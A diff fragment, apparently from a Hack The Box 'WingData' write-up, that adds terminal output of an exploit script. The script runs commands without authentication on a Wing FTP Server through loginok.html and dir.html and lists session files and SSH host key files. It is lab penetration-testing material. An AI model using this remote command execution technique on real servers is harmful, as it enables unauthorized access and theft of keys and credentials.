@@ -280,3 +280,45 @@ after encode it output is :
 </USER_ACCOUNTS>
 ```
 
+```
+(venv) ajdev@rootbox:~/HTB/WingData$ python3 exploitdb.py -u http://ftp.wingdata.htb -c "ls -la /opt/wftpserver/session"
+
+[*] Testing target: http://ftp.wingdata.htb
+[+] Sending POST request to http://ftp.wingdata.htb/loginok.html with command: 'ls -la /opt/wftpserver/session' and username: 'anonymous'
+[+] UID extracted: 2a9023d2f17beb091463e1e95e6dffaaf528764d624db129b32c21fbca0cb8d6
+[+] Sending GET request to http://ftp.wingdata.htb/dir.html with UID: 2a9023d2f17beb091463e1e95e6dffaaf528764d624db129b32c21fbca0cb8d6
+
+--- Command Output ---
+total 44
+drwxr-x--- 2 wingftp wingftp 4096 Feb 15 10:29 .
+drwxr-x--- 9 wingftp wingftp 4096 Feb 15 09:15 ..
+-rw------- 1 wingftp wingftp  205 Feb 15 10:29 2a9023d2f17beb091463e1e95e6dffaaf528764d624db129b32c21fbca0cb8d6.lua
+-rw------- 1 wingftp wingftp  129 Feb 15 10:19 43d0d57ab0299b46b0ce9b8448cad6a6f528764d624db129b32c21fbca0cb8d6.lua
+-rw------- 1 wingftp wingftp  129 Feb 15 10:19 4fbfa85450eb8d2a74117da1ed8f6e8ef528764d624db129b32c21fbca0cb8d6.lua
+-rw------- 1 wingftp wingftp  129 Feb 15 10:23 61d048d9ede0e9c066265a2b2cf0dda4f528764d624db129b32c21fbca0cb8d6.lua
+-rw------- 1 wingftp wingftp  129 Feb 15 10:27 6b0a2a284ba2015eb96573a7037bd116f528764d624db129b32c21fbca0cb8d6.lua
+-rw------- 1 wingftp wingftp  129 Feb 15 10:24 815770b86d93aedfa7c06fae64905d33f528764d624db129b32c21fbca0cb8d6.lua
+-rw------- 1 wingftp wingftp  129 Feb 15 10:28 88452282076d82ab4be5dbf8bc527a9df528764d624db129b32c21fbca0cb8d6.lua
+-rw------- 1 wingftp wingftp  129 Feb 15 10:19 bbd3e6be6a400b4ebf88c2219366628ff528764d624db129b32c21fbca0cb8d6.lua
+-rw------- 1 wingftp wingftp  129 Feb 15 10:26 fd1fe4640c92ed1053aa21f3f1dfc939f528764d624db129b32c21fbca0cb8d6.lua
+----------------------
+(venv) ajdev@rootbox:~/HTB/WingData$ python3 exploitdb.py -u http://ftp.wingdata.htb -c "ls -la /opt/wftpserver/Data"
+
+[*] Testing target: http://ftp.wingdata.htb
+[+] Sending POST request to http://ftp.wingdata.htb/loginok.html with command: 'ls -la /opt/wftpserver/Data' and username: 'anonymous'
+[+] UID extracted: e7c0c2e70f3268f8380132be9159cd01f528764d624db129b32c21fbca0cb8d6
+[+] Sending GET request to http://ftp.wingdata.htb/dir.html with UID: e7c0c2e70f3268f8380132be9159cd01f528764d624db129b32c21fbca0cb8d6
+
+--- Command Output ---
+total 40
+drwxr-x--- 4 wingftp wingftp  4096 Feb 15 09:15 .
+drwxr-x--- 9 wingftp wingftp  4096 Feb 15 09:15 ..
+drwxr-x--- 4 wingftp wingftp  4096 Feb  9 08:19 1
+drwxr-x--- 2 wingftp wingftp  4096 Feb 15 09:15 _ADMINISTRATOR
+-rw------- 1 wingftp wingftp 11264 Nov  2 11:11 bookmark_db
+-rwxr-x--- 1 wingftp wingftp  2554 Nov  2 16:23 settings.xml
+-rwxr-x--- 1 wingftp wingftp   241 Nov  2 11:12 ssh_host_ecdsa_key
+-rw-rw-rw- 1 wingftp wingftp  3272 Nov  2 11:52 ssh_host_key
+----------------------
+(venv) ajdev@rootbox:~/HTB/WingData$
+```
